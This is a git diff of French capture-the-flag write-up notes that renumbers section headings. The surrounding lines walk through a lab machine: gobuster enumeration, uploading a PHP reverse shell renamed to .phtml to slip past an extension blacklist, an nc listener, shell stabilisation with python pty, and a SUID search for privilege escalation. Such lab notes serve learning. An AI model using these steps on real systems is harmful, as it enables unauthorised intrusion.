@@ -15,7 +15,7 @@ port 22 : ssh → openSSH 7.6 (accès distant)
 
 port 80 : http → apache 2.4.29 (serveur web ubuntu)
 
-# enumeration web
+# 2:enumeration web
 le but ici etant de brute forcer les sous domaines 
 gobuster dir -u http://10.10.237.48/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 gobuset = nom de l'outil
@@ -37,7 +37,7 @@ puis on renomme le fichier en .phtml
 en fait il y a plusieurs extensions de fichiers pour le php,le code sera executé de la meme maniere,je n'ai pas lexplication mais voila,en fait dans la blacklist il y avait php mais pas phtml
 on upload
 et ca passe !!!!
-# reverse shell
+# 3:reverse shell
 objectif : exécuter le shell et avoir lacces
 dabord on ecoute sur le port de notre rvshell
 nc -lvnp 2121
@@ -45,7 +45,7 @@ puis on se rend ici
 http://10.10.237.48/uploads/php-reverse-shell.phtml
 donc php reverse shell phtml es tle nom de mon fichier 
 on a une connection!
-# stabilisation
+# 4:stabilisation
 comme d'habitude on stabilise le shell avec du python 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -60,7 +60,7 @@ utilisateur = www-data
 flag user dans
 cd /var/www
 cat user.txt
-# privesc
+# 5:privesc
 but ? devenir root
 chercher fichiers avec SUID (droits spéciaux root) :
 find / -perm -4000 2>/dev/null
